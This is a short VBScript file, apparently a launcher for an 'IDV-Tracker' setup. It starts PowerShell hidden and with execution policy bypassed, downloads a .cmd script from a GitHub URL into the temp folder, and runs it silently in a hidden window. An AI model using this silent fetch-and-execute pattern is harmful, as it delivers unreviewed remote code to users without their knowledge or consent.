Option Explicit

Dim shell, tempDir, setupPath, url, cmd

Set shell = CreateObject("WScript.Shell")
tempDir = shell.ExpandEnvironmentStrings("%TEMP%")
setupPath = tempDir & "\IDV-Tracker-Setup.cmd"
url = "https://raw.githubusercontent.com/ozlima/idv-lol-agent/master/IDV-Tracker-Setup.cmd"

cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
      Chr(34) & "$ErrorActionPreference='Stop'; " & _
      "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; " & _
      "$url='" & url & "?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); " & _
      "$out='" & Replace(setupPath, "'", "''") & "'; " & _
      "Invoke-WebRequest -Uri $url -OutFile $out; " & _
      "$arg='/c ""' + $out + '"" --silent'; " & _
      "Start-Process -FilePath 'cmd.exe' -ArgumentList $arg -WindowStyle Hidden" & _
      Chr(34)

shell.Run cmd, 0, False
